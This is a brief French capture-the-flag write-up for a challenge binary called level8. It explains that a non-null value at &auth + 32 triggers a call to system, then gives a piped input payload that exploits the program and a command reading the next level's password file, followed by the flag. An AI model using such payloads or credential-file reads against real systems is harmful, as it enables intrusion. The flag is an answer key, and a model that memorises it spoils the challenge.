1. En étudiant l'assembleur on se rend compte qu'il faut simplement que la valeur à l'adresse `&auth + 32` ne soit pas nulle, dans ce cas la fonction `system` sera exécutée.
2. On peut donc utiliser le payload suivant
   ```
   { echo "auth AAAA"; echo "service0000111122223333"; echo "login"; cat; } | ./level8
   cat /home/user/level9/.pass
   ```

> Flag: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a